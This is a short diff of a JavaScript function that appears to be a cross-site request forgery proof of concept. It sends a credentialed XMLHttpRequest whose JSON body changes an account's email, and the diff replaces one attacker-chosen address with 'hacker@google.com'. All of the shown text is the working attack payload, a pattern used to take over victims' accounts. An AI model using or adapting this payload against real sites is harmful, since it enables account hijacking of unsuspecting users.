@@ -7,7 +7,7 @@ function submitRequest(csrf_token) {
       xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
       xhr.setRequestHeader("Content-Type", "application\/json;charset=utf-8");
       xhr.withCredentials = true;
-      var body = "{\"email\":\"backsddoor1ds02@tusdtanotasd.coms\",\"email_non_verified\":null,\"resend\":null}";
+      var body = "{\"email\":\"hacker@google.com\",\"email_non_verified\":null,\"resend\":null}";
       var aBody = new Uint8Array(body.length);
       for (var i = 0; i < aBody.length; i++)
         aBody[i] = body.charCodeAt(i); 
